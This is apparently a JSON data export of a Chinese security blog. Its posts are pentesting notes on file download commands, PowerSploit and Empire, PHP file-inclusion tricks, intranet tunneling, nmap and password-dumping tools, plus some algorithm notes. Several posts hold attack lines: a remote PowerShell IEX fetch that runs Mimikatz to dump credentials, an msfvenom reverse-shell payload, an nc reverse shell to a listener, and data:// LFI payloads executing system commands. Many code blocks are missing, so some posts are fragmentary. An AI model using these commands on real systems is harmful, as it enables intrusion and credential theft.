{"meta":{"title":"千夜","subtitle":"千夜的博客","description":"千夜的博客","author":"千夜","url":"http://flowray.top"},"pages":[{"title":"关于本博客","date":"2017-09-29T14:44:34.131Z","updated":"2017-09-29T14:44:34.130Z","comments":false,"path":"about/index.html","permalink":"http://flowray.top/about/index.html","excerpt":"","text":"关于本博客在这里记录下学习与思考的过程，时不时的总结一下学习与思考的经历。 关于我安全小菜一枚~~"},{"title":"安全博客","date":"2017-09-29T14:58:15.269Z","updated":"2017-09-29T14:58:15.269Z","comments":false,"path":"links/index.html","permalink":"http://flowray.top/links/index.html","excerpt":"","text":"学习之路 安全博客 SECVUL安全弱点实验室Michael"},{"title":"标签","date":"2017-09-29T15:03:53.080Z","updated":"2017-09-29T15:03:53.080Z","comments":true,"path":"tags/index.html","permalink":"http://flowray.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"常用文件下载及服务开启命令","slug":"常用的文件下载及服务开启命令","date":"2018-02-21T09:55:33.656Z","updated":"2018-02-21T09:58:19.330Z","comments":true,"path":"secure/常用的文件下载及服务开启命令.html","link":"","permalink":"http://flowray.top/secure/常用的文件下载及服务开启命令.html","excerpt":"","text":"1 前言在内网渗透中经常需要远程下载脚本、程序及文件，所以总结一下常用的下载命令及开启FTP服务的命令及脚本。 2 常见下载命令2.1 Linux2.1.1 wgetwget可以很方便的下载远程文件。123456常用参数：-e: 断点续传-r: 递归下载（目录下所有的文件及子目录）-np: 递归下载时不搜索上层目录-k: 把绝对链接改为相对链接-p: 下载网页需要的全部文件 下载文件(下载到当前目录)： 下载文件夹： 2.1.2 curlcurl是Linux下的另一款下载上传工具。123常用参数：-o 保存下载的文件到指定的文件中-C 断点续传 下载文件： 更详细的操作请查看帮助或参考这里。 2.2 Windows2.2.1 PowershellPowershell是一种windows原生的脚本语言，可以实现许多复杂的功能。 使用如下命令下载文件：powershell (New-Object System.Net.WebClient).DownloadFile(&quot;http://127.0.0.1:8888/&quot;, &quot;f:/b.txt&quot;) 注意： 需要指定文件保存路径，若直接指定文件名，那么会直接下载到当前用户的家目录下。 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。set-executionpolicy unrestricted 2.2.2 BITSAdminBITSAdmin是windows自带的一个用于下载和上传文件的命令行工具，详细使用参数使用bitsadmin /?查看。 可以使用如下命令来下载文件：bitsadmin /transfer MyDownloadJob /download /priority normal http://127.0.0.1:8888/a.txt f:\\a.txt 3 常用的开启服务器的命令3.1 Python3.1.1 Python3python3 -m http.server 8080 3.1.2 Python2python2 -m simpleserver 8080 3.2 Node12npm install http-server -ghttp-server -p 7788","categories":[{"name":"安全","slug":"secure","permalink":"http://flowray.top/categories/secure/"}],"tags":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://flowray.top/tags/渗透技巧/"},{"name":"文件下载及服务开启命令","slug":"文件下载及服务开启命令","permalink":"http://flowray.top/tags/文件下载及服务开启命令/"}]},{"title":"Empire使用小结","slug":"Empire使用小结","date":"2018-02-21T06:30:05.335Z","updated":"2018-02-21T06:44:08.664Z","comments":true,"path":"tool/Empire使用小结.html","link":"","permalink":"http://flowray.top/tool/Empire使用小结.html","excerpt":"","text":"1 Empire简介在对内网的渗透中，Empire框架集成了在内网渗透能用到的powershell脚本，是域渗透神器。 1.1 Empire安装2 Empir使用win7x64 提权没有成功。win10x64 提权时会弹出事件记录器。 win 7 提权的时候会返回一个agent, 返回到mian 然后在进入相应的listen。 返回慢，需要等待。 End 参考文档1. Empire官方文档 2. 域渗透神器Empire安装和简单使用","categories":[{"name":"工具","slug":"tool","permalink":"http://flowray.top/categories/tool/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://flowray.top/tags/内网渗透/"},{"name":"工具","slug":"工具","permalink":"http://flowray.top/tags/工具/"}]},{"title":"Powersploit使用小结","slug":"Powersploit使用小结","date":"2018-02-21T06:29:46.812Z","updated":"2018-02-21T06:35:39.864Z","comments":true,"path":"tool/Powersploit使用小结.html","link":"","permalink":"http://flowray.top/tool/Powersploit使用小结.html","excerpt":"","text":"1 前言2 PowerShellpoweshell是cmd.exe的扩充，可以直接使用.net。可以使用Get-Host来查看powershell当前的版本。 2.1 PowerShell 常用命令 本地权限绕过执行PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 本地隐藏权限绕过执行脚本PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive-NoProfile -WindowStyle Hidden(隐藏窗口) -File xxx.ps1 直接用IEX下载远程的PS1脚本回来权限绕过执行powershell &quot;IEX (New-ObjectNet.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&quot; 3 Powersploit3.1 项目简介一款基于powershell的后渗透（Post-Exploitation）框架，集成大量渗透相关模块和功能。可以在github下载：项目地址。 下载完成后可以使用python开启服务器，python3 -m http.server 8080。 3.2 常用脚本记录常用脚本。 3.2.1 代码执行3.2.1.1 Invoke-ShellcodeInvoke-Shellcode的作用是：将shellcode插入您选择的进程ID或本地PowerShell中。与Metasploit配合可以出其不意。首先生成反弹木马： msfvenom -p windows/meterpreter/reverse_https lhost=10.10.10.137 lport=7788 -f powershell -o /root/mytool/msf win7下载： 3.2.1.1 Invoke-DllInjectionInvoke-DllInjection的作用是注入dll。 3.2.2 内网信息侦察3.2.2.1 Invoke-PortscanInvoke-Portscan的作用是扫描内网信息。 3.2.3 主机信息侦察3.2.3.1 Invoke-MimikatzInvoke-Mimikatz的作用是抓取管理员密码。 3.2.3.2 Get-Keystrokes键盘记录。 3.2.3.2 Get-KeystrokesInvoke-NinjaCopy的作用是复制文件。 3.3 查看帮助文档首先导入模块：Import-Module .\\PowerSploit查看帮助Get-Help PowerSploit 更详细的查看每个脚本的帮助文件。 4 总结powershell可以得到意想不到的效果，多加利用。 End 参考资料1. 说说Powersploit在内网渗透中的使用 2. 渗透利器之Powershell 3. PowerSploit+Metasploit=Shells 4. Powershell &amp; Powersploit 入门","categories":[{"name":"工具","slug":"tool","permalink":"http://flowray.top/categories/tool/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://flowray.top/tags/内网渗透/"},{"name":"工具","slug":"工具","permalink":"http://flowray.top/tags/工具/"}]},{"title":"PHP文件包含漏洞小结","slug":"PHP文件包含漏洞","date":"2018-02-20T08:41:15.479Z","updated":"2018-02-20T08:44:25.361Z","comments":true,"path":"secure/PHP文件包含漏洞.html","link":"","permalink":"http://flowray.top/secure/PHP文件包含漏洞.html","excerpt":"","text":"1 基本概念1.1相关函数php中引发文件包含漏洞的函数通常是以下四个函数： include() include_once() require() require_once() include()包含如果出错，如文件不存在，提出警告然后继续执行。 require()包含文件出错，直接退出。 require_once() 和 include_once()与require()和include()功能相似，只是为了防止重复包含。 当使用这几个函数包含文件时，不管文件是什么类型，都会被解析成php。 1.2 场景 具有相关的文件包含函数。 文件包含函数中存在变量，比如include $file。 攻击者可以控制变量，比如$file = $_GET[file]。 1.3 分类1.3.1 LFI(本地文件包含)能够打开并包含本地文件的漏洞。 1.3.2 RFI(远程文件包含)能够包含远程服务器的文件并执行，危害性很，但是需要利用条件。 allow_url_fopen = On allow_url_include = On 注：当包含远程文件也是php时，php文件会在远程服务器执行。 在php.ini中，allow_url_fopen默认为On而allow_url_include在php5.2后默认为Off。 2 包含姿势测试代码： allow_url_fopen = On allow_url_include = Off 2.1 PHP伪协议2.1.1 php://input利用条件： allow_url_include = On 对allow_url_fopen不做要求。 姿势： 2.1.2 php://filter利用条件：无特别要求。 姿势：http://localhost/test/FileInclude/index.php?file=php://filter/read=convert.base64-encode/resource=info.txt 可以读取base64加密后的文件源码。 注：少了read关键字。http://localhost/test/FileInclude/index.php?file=php://filter/convert.base64-encode/resource=info.txt 2.1.3 phar://利用条件： php &gt; 5.3.0 姿势：假如有个zip压缩包，其中的文件为info.txt相对路径：当然也可以使用绝对路径。 2.1.4 zip://利用条件： php &gt;= 5.3.0 姿势：与phar相同。 使用zip协议，需要指定绝对路径。同时将#编码为%23。如果时相对路径，那么包含失败 2.1.5 data:URL schema利用条件： php &gt;= 5.2 allow_url_fopen = On allow_url_include = On 姿势一：http://localhost/test/FileInclude/index.php?file=data://text/plain,&lt;?php phpinfo();?&gt; 执行系统命令：http://localhost/test/FileInclude/index.php?file=data://text/plain,&lt;?php system(&#39;whoami&#39;);?&gt; 姿势二：http://localhost/test/FileInclude/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b PD9waHAgcGhwaW5mbygpOz8+的base64解码为&#39;&lt;?php phpinfo();?&gt;,而+的url编码为%2b。 执行系统命令：http://localhost/test/FileInclude/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== 其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#39;whoami&#39;);?&gt; 2.2 包含session利用条件： session文件路径已知，且其中部分内容可控。 姿势：php的session文件保存路径可以在phpinfo的session.save_path看到。 常见的php_session存放位置： /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件的命名格式为sess_[PHPSESSID]。PHPSESSID可以在发送请求的cookie中查到。 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 参考文章： 2.3 包含日志2.3.1 访问日志利用条件： 知道服务器日志的存储路径，且日志文件可读。 姿势：很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。 包含日志后执行： 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 2.3.2 SSH log利用条件： 知道ssh-log的位置且可读。默认为/var/log/auth.log 姿势：用ssh远程连接，密码无所谓：然后就可以写入php代码：利用： 2.4 包含environ利用条件： php以cgi的方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 姿势：proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 参考： shell via LFI - proc/self/environ method The proc/self/environ Injection 2.5 包含fd与包含environ类似。参考： LFI Cheat Sheet：/proc/self/environ LFI Method 2.6 包含临时文件 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。参考：LFI WITH PHPINFO() ASSISTANCE 类似利用临时文件的存在，竞争时间去包含的，参考：XMAN夏令营-2017-babyweb-writeup 2.7 包含上传文件利用条件： 运乎之妙，存乎一心。知道上传文件在哪，叫啥。 姿势：配合上传漏洞。 2.8 其他一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。 3 绕过姿势接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的include $_GET[‘file’];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀： 3.1 指定前缀测试代码： 3.1.1 目录遍历测试代码： 可以使用../进行目录遍历： 3.1.2 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。 利用url编码： ../ ..%2f %2e%2e%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 二次编码,服务器有可能解码一次 ../ %252e%252e%252f ..\\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af 注： %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 3.2 指定后缀 3.2.1 URLurl格式：protocol :// hostname[:port] / path / [;parameters][?query]#fragment姿势一： 3.3 利用协议3.3.1 长度截断3.3.2 0字节截断4 防御方案Refference","categories":[{"name":"安全","slug":"secure","permalink":"http://flowray.top/categories/secure/"}],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://flowray.top/tags/WEB安全/"},{"name":"文件包含","slug":"文件包含","permalink":"http://flowray.top/tags/文件包含/"}]},{"title":"内网穿透小结","slug":"内网代理与转发小结","date":"2018-02-20T08:15:59.008Z","updated":"2018-02-20T08:34:09.311Z","comments":true,"path":"secure/内网代理与转发小结.html","link":"","permalink":"http://flowray.top/secure/内网代理与转发小结.html","excerpt":"","text":"1 前言内网环境非常复杂，在内网中行动需要代理及端口转发等各种功能。 2 基本知识概念梳理2.1 正向代理与反向代理 正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和 server 同属一个 LAN，对 client 透明。 实际上 proxy 在两种代理中做的事都是代为收发请求和响应，不过从结构上来看正好左右互换了下，所以把前者那种代理方式叫做正向代理，后者叫做反向代理。 2.2 端口转发2.2 内网常见环境3 工具整理3.1 Lcx转发3.2 NC反弹3.2.1 正向连接3.2.2 反向连接 在公网监听nc -lp 5555 在内网机器反弹nc -t -e cmd 10.10.10.11 5555 3.3 Termite3.3.1 简介Termite是一个跳板机管理工具，多平台支持。具有SOCKS5架设、端口转发、shell服务假设、文件上传下载功能。可以在复杂的网络环境内打通一条通道。 3.3.2 下载地址http://rootkiter.com/Termite/ 3.3.3 使用介绍官网有工具使用视频。 3.4 reGeorg3.4.1 简介reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个 socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。 3.4.2 下载地址https://github.com/NoneNotNull/reGeorg 3.4.3 使用将对应的脚本上传到目标服务器上，然后配合代理软件即可扫描等操作。windows使用proxifire,Linux使用Proxychains。 3.4 SSH隧道代理转发ssh 有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。123456789101112131415161718192021本地访问127.0.0.1:port1就是host:port2(用的更多)ssh -CfNg -L port1:127.0.0.1:port2 user@host #本地转发访问host:port2就是访问127.0.0.1:port1ssh -CfNg -R port2:127.0.0.1:port1 user@host #远程转发可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip #正向隧道，监听本地port可以将dmz_host的hostport端口转发到remote_ip的port端口ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip #反向隧道，用于内网穿透防火墙限制之类socket代理:ssh -qTfnN -D port remotehost参数详解：-q Quiet mode. 安静模式-T Disable pseudo-tty allocation. 不占用 shell 了-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数-N Do not execute a remote command. 不执行远程命令，端口转发就用它了-L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport-R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport-D port 指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发. 3.4.1 ssh 本地转发一台机器的某个应用（比如mysql限制了root只能本地登陆）限制了只有本机才能登陆此应用，如果我们想要远程登陆此应用，就可以使用ssh的本地转发。 命令格式：ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 例如MySQL本地转发：10.10.10.129：mysql服务所在机器。注意：ssh可以远程登陆mysql服务器。 3.4.1 ssh 远程转发内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。ssh -CfNg -R 81:127.0.0.1:80 &lt;ssh server&gt; 3.4.3 ssh 动态转发 socks 代理把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接, 该连接就经过 ssh 隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。ssh -qTfnN -D &lt;local port&gt; &lt;ssh server&gt; 例子：设置转发： 使用代理： 3.6 sSocks3.7 socat3.7.1 正向shell3.7.2 反向shell3.8 内网穿透平台例如 https://www.ngrok.cc/、https://natapp.cn / 等 4 参考资料1. 实战 SSH 端口转发 1. 内网端口转发及穿透 2. 实战 SSH 端口转发 3. 内网渗透工具总结 4. Cobalt strike在内网渗透中的使用 5. 穿越边界的姿势 6. 内网渗透 7. 多重转发渗透隐藏内网 8. Linux 端口转发特征总结","categories":[{"name":"安全","slug":"secure","permalink":"http://flowray.top/categories/secure/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://flowray.top/tags/内网渗透/"},{"name":"代理与转发","slug":"代理与转发","permalink":"http://flowray.top/tags/代理与转发/"}]},{"title":"位运算常见问题","slug":"位运算常见问题","date":"2017-11-02T13:45:41.339Z","updated":"2017-11-21T16:15:25.510Z","comments":true,"path":"program/位运算常见问题.html","link":"","permalink":"http://flowray.top/program/位运算常见问题.html","excerpt":"","text":"前言位运算常见的问题。 整数交换问题描述不申请新的变量交换a,b。 12345void swap(int &amp;a, int &amp;b)&#123; a = a ^ b; b = a ^ b; a = a ^ b;&#125; 同时也可以用 +,- 做。 12345void swap(int &amp;a, int &amp;b)&#123; a = a + b; b = a - b; a = a - b;&#125; 比较寻找出现奇数次的数字(I)问题描述有一个整型数组A，其中只有一个数出现了奇数次，其他的数都出现了偶数次，请打印这个数。要求时间复杂度为O(N)，额外空间复杂度为O(1)。 给定整形数组A及它的大小n，请返回题目所求数字。 解题思路n ^ 0 = n, n ^ n = 0. 依数字次异或到最后就剩那个出现奇数次的数字。 参考代码1234567int find_num(vector&lt;int&gt; A, n)&#123; int res = 0; for(int i = 0; i &lt; n; i++)&#123; res = res ^ A[i]; &#125; return res;&#125; 寻找出现奇数次的数字(II)问题描述给定一个整型数组arr，其中有两个数出现了奇数次，其他的数都出现了偶数次，找到这两个数。要求时间复杂度为O(N)，额外空间复杂度为O(1)。 给定一个整形数组arr及它的大小n，请返回一个数组，其中两个元素为两个出现了奇数次的元素,请将他们按从小到大排列。 解题思路首先可以得出现次数为奇数次两个数字的异或值res，然后求出res不为0的比特位数。 参考代码123456789101112131415161718192021222324252627282930313233343536vector&lt;int&gt; find_num(vector&lt;int&gt; arr, int n)&#123; //res = a ^ b int res = 0; for(int i = 0; i &lt; n; i++)&#123; res = res ^ arr[i]; &#125; //get the non_zero bit int k = 0; while(!((res&gt;&gt;k)&amp;1))&#123; ++k; &#125; //get a int a = 0; for(int i = 0; i &lt; n; i++)&#123; if((arr[i]&gt;&gt;k)&amp;1)&#123; a = a ^ arr[i]; &#125; &#125; //get b int b = a ^ res; vector&lt;int&gt; out; if(a &lt; b)&#123; out.push_back(a); out.push_back(b); &#125;else&#123; out.push_back(b); out.push_back(a); &#125; return out;&#125;","categories":[{"name":"编程","slug":"program","permalink":"http://flowray.top/categories/program/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://flowray.top/tags/编程/"},{"name":"数据结构","slug":"数据结构","permalink":"http://flowray.top/tags/数据结构/"}]},{"title":"Nmap小结","slug":"nmap小结","date":"2017-09-30T02:34:25.119Z","updated":"2017-09-30T05:28:13.866Z","comments":true,"path":"tool/nmap小结.html","link":"","permalink":"http://flowray.top/tool/nmap小结.html","excerpt":"","text":"Nmap常用的扫描策略主机发现并生成存活列表12nmap -sn -T4 -oG discover 192.168.10.0/24grep &quot;Status: Up&quot; discover | cut -d &apos; &apos; -f 2 端口发现，发现大部分常用端口","categories":[{"name":"工具","slug":"tool","permalink":"http://flowray.top/categories/tool/"}],"tags":[{"name":"扫描工具","slug":"扫描工具","permalink":"http://flowray.top/tags/扫描工具/"},{"name":"Nmap","slug":"Nmap","permalink":"http://flowray.top/tags/Nmap/"}]},{"title":"常用密码读取工具","slug":"密码读取","date":"2017-09-29T15:51:51.067Z","updated":"2017-09-29T15:53:27.257Z","comments":true,"path":"tool/密码读取.html","link":"","permalink":"http://flowray.top/tool/密码读取.html","excerpt":"前言在安全测试的过程中，读取已被控制的主机的密码十分有用，所以总结一下。 这两个网页的工具非常有用： http://securityxploded.com/password-dump-tools.php http://www.nirsoft.net/ 1. Windows密码抓取神器 mimikatz一个轻量级的调试器，可以帮助安全人员抓取Windows密码，缺点是需要管理员权限。mimikatz可以结合metasploit获得域控服务器的密码。点击查看 官网地址","text":"前言在安全测试的过程中，读取已被控制的主机的密码十分有用，所以总结一下。 这两个网页的工具非常有用： http://securityxploded.com/password-dump-tools.php http://www.nirsoft.net/ 1. Windows密码抓取神器 mimikatz一个轻量级的调试器，可以帮助安全人员抓取Windows密码，缺点是需要管理员权限。mimikatz可以结合metasploit获得域控服务器的密码。点击查看 官网地址 2. 系统综合密码读取 LaZagneLaZagne是一个开源的检查本地计算机的密码的工具。 官网地址 3. 浏览器密码获取 BrowserPasswordDumpBrowserPasswordDump可以浏览多种浏览器的密码记录。官方地址 4. windows 网络密码 NetworkPasswordRecovery最好下载X86和X64两个版本的。官网地址 5. 邮件客户端密码 Email Password Dump支持多种邮件客户端。官网链接 6. 注册表密码查看REG query HKCU /v &quot;pwd&quot; /s #pwd可替换为password \\ HKCU 可替换为HKCR","categories":[{"name":"工具","slug":"tool","permalink":"http://flowray.top/categories/tool/"}],"tags":[{"name":"密码读取工具","slug":"密码读取工具","permalink":"http://flowray.top/tags/密码读取工具/"}]},{"title":"常见源码泄露","slug":"常见源码泄露","date":"2017-09-29T15:47:12.749Z","updated":"2018-01-12T10:05:48.567Z","comments":true,"path":"secure/常见源码泄露.html","link":"","permalink":"http://flowray.top/secure/常见源码泄露.html","excerpt":"","text":"前言由于开发人员的疏忽，可以见到源码泄露问题。总结一下源码泄露问题。 源码泄露分类.hg源码泄露漏洞成因hg init的时候会生成.hg 漏洞利用工具：dvcs-ripper rip-hg.pl -v -u http://www.example.com/.hg/ .git源码泄露漏洞成因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 漏洞利用工具：dvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ .Ds_Store文件泄露漏洞成因在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 Eg:http://www.example.com/.ds_store 漏洞利用工具：dsstoreexp python ds_store_exp.py http://www.example.com/.DS_Store SVN导致文件泄露漏洞成因Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 Eg: http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries 漏洞利用工具：dvcs-ripper Seay-Svn WEB-INF/web.xml泄露","categories":[{"name":"安全","slug":"secure","permalink":"http://flowray.top/categories/secure/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://flowray.top/tags/安全/"},{"name":"常见漏洞","slug":"常见漏洞","permalink":"http://flowray.top/tags/常见漏洞/"}]},{"title":"栈与队列（一）","slug":"栈与队列","date":"2017-09-29T15:39:39.625Z","updated":"2017-09-29T15:49:23.060Z","comments":true,"path":"program/栈与队列.html","link":"","permalink":"http://flowray.top/program/栈与队列.html","excerpt":"","text":"0X00 前言由于要找工作，自己的编程又太烂。所以赶紧刷一波数据结构与算法，书到用时方恨少。心痛！总是欠下的债总是要还的。 ###","categories":[{"name":"编程","slug":"program","permalink":"http://flowray.top/categories/program/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://flowray.top/tags/编程/"},{"name":"数据结构","slug":"数据结构","permalink":"http://flowray.top/tags/数据结构/"}]},{"title":"Hello, World!","slug":"Hello","date":"2017-09-29T15:23:09.768Z","updated":"2018-02-20T08:28:30.858Z","comments":true,"path":"readThink/Hello.html","link":"","permalink":"http://flowray.top/readThink/Hello.html","excerpt":"","text":"博客一篇…… 博客旨在记录与总结学过的知识，读过的书。 结语知行合一","categories":[{"name":"读思","slug":"readThink","permalink":"http://flowray.top/categories/readThink/"}],"tags":[{"name":"感想","slug":"感想","permalink":"http://flowray.top/tags/感想/"}]}]}